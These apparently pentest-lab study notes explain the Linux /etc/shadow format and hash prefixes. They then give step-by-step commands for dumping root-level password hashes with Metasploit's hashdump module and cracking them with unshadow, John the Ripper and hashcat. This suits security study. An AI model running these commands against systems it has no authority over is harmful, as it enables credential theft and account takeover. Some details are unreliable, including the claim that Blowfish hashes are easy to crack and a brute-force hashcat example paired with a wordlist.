# Linux: Dump & Crack Password Hashes
> With Linux (and unlike Windows: pass-the-hash, etc.) there is not a lot you can do with password hashes except try to crack them.


## Content
- [Files Relevant to Password Hashes]()
  - [/etc/passwd]()
  - [/etc/shadow]()
- [Linux Password Hashes]()
  - [/etc/shadow Fields & Format]()
  - [Colon Delimited Fields]()
  - [Password Field & Hash Algorithm]()
- []()

## Files Relevant to Password Hashes
- Linux has mult-user support and as a result multiple users can access the system simultaneously.
- This can be seen as both an advantage and a disadvantage from a security perspective.
- Multiple accounts offer multiple access vectors for attakers and therefore increase the overall risk of the server/system.

### /etc/passwd
- All of the information for all accounts on Linux is stored in the `/etc/passwd` file.
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system. 

### /etc/shadow
- All the encrypted passwords for the users are stored in the `/etc/shadow` file. 
- The shadow file can only be accessed and read by root (or a user account who is part of the root group or who has sudo privileges).
- This is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.

## Linux Password Hashes
- The `/etc/shadow` file gives us information in regards to the **hashing algorithm** that is being used and the password hash.
- This is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength.
- We can determine this by looking at the number after the username encapsulated (prefixed) by the dollar sign symbol.

### /etc/shadow Fields & Format
```
mark:$6$.n.:17736:0:99999:7:::
[--] [----] [---] - [---] ----
|      |      |   |   |   |||+-----------> 9. Unused
|      |      |   |   |   ||+------------> 8. Expiration date
|      |      |   |   |   |+-------------> 7. Inactivity period
|      |      |   |   |   +--------------> 6. Warning period
|      |      |   |   +------------------> 5. Maximum password age
|      |      |   +----------------------> 4. Minimum password age
|      |      +--------------------------> 3. Last password change
|      +---------------------------------> 2. Encrypted Password
+----------------------------------------> 1. Username
```
Source: https://linuxize.com/post/etc-shadow-file/

### Colon Delimited Fields

| # | Field | Description |
|---| ----- | ------------|
| 1 | username | A valid account name, which exist on the system |
| 2 | password | Enrypted password; hash indicated by `$#$` |
| 3 | Last password change | The date of the last password change, expressed as the number of days since Jan 1, 1970 (Unix time).  | 
| 4 | Minimum password age | The minimum number of days required between password changes | 
| 5 | Maximum password age | The maximum number of days the password is valid | 
| 6 | Warning period | The number of days before expiry when user is warned to change password | 
| 7 | Inactivity period | The number of days after expiry that account is disabled | 
| 8 | Expiration date | The account expiry date (unix time) | 
| 9 | Unused | n/a |

### Password Field & Hash Algorithm
- Your encrypted password is in hash format.
- The password should be minimum 15-20 characters long including special characters, digits, lower case alphabetic and more.
- Usually password format is set to `$id$salt$hashed`, The `$id` is the algorithm prefix used On GNU/Linux as follows:
  - `$1$` is MD5
  - `$2a$` is Blowfish
  - `$2y$` is Eksblowfish
  - `$5$` is SHA-256
  - `$6$` is SHA-512
  - `$y$` is yescrypt
- MD5 and Blowfish are fairly easy to crack. 

## MetaSploit: Dump & Crack
> This is from a lab. The assumption is that you have gained initial and root access to a Linux machine.

### The Setup
- Assumption: You gained an interactive shell (`/bin/bash -i`) from your initial exploit using MetaSploit.
- Assumption: You have root access, but shell only.
- Background your shell session (ctrl-z or bg or background).

### Upgrade Your Session
```
> sessions -u 1
```
- `-u` is for upgrade
- `1`  is the session id number for your shell access to the target
- When you hit enter you should get a meterpreter session in additional to your shell session.
- Background your meterpreter session (ctrl-z or bg or background).

### Dump the Password Hashes
```
> search hashdump
  # Looking for the Linux hashdump module
> use /post/linux/gather/hashdump
> show options
> set SESSION [meterpreter session id#]
> run
```
- This will automagically get all the user accounts that have passwords and therefore hashes.
- Metasploit will save those hashes in a special "unshadowed" file:
  - Example: `/root/.msf4/loot/20231129022617_default_192.95.124.3_linux.hashes_000543.txt'
- That file contains the hashes in a form ready to be cracked.

### Crack the Password Hashes
```
> search crack_linux
> use auxiliary/analyze/crack_linux
  # Password Cracker: Linux
> set [options]
  # apparently it knows to look into the /root/.msf4/ subdir and just tries to crack all it found in there
```
- You should get a green `[+]` and plaintext username/password if successful

## Manual: Dump & Crack
> We can grab the password hashes directly from the /etc/shadow file and attempt to crack them with John the Ripper and/or Hashcat.

### John the Ripper

#### Step 1: Unshadow
- If your system is ancient enough that it keeps passwords right in the world-readable /etc/passwd, simply make a copy of that file.
- However, if your system uses shadow passwords, you may use John's "unshadow" utility to obtain the traditional Unix password file: 
```
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

#### Step 2: Crack
```
john unshadowed.txt
# this is the default

john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
# use a custom wordlist to crack

john --format=sha512crypt unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
# use a custom wordlist and specifiy the encryption algorythm ($6$ is SHA-512)
```

#### Show Cracked Passwords
```
john --show unshadowed.txt
```

### Hashcat

#### Hash Mode
- The most important piece of information here is the hash mode.
- Find it with grep: `hashcat --help | grep SHA512`
- Should be ID 1800

#### Syntax
```
hashcat [options] hashfile /path/to/wordlist.txt
hashcat -a 3 -m 1800 /path/to/hash_file.txt /usr/share/wordlists/rockyou.txt
```
- Note that your wordlist is **_NOT_** an option. Just tag it on the end.

#### Various Key Options
- `-a, --attack-mode=NUM` : Attack-mode, see references below
  - Attack mode NUM:
  - `0` = Straight
  - `1` = Combination
  - `2` = Toggle-Case
  - `3` = Brute-force
  - `4` = Permutation
  - `5` = Table-Lookup
  - `8` = Prince
- `-m, --hash-type=NUM` : Hash-type, see references below
  - Hash types NUM, sample:
  - `0` = MD5
  - `100` = SHA1
  - `900` = MD4
  - `1000` = NTLM
  - `1400` = SHA256
  - `1700` = SHA512
  - `1800` = SHA-512(Unix)
- `-o, --outfile=FILE` : Define outfile for recovered hash
- `--outfile-format=NUM` : Define outfile-format for recovered hash, see references below
  - Outfile formats NUM, sample:
  - `1` = hash[:salt]
  - `2` = plain
  - `3` = hash[:salt]:plain 







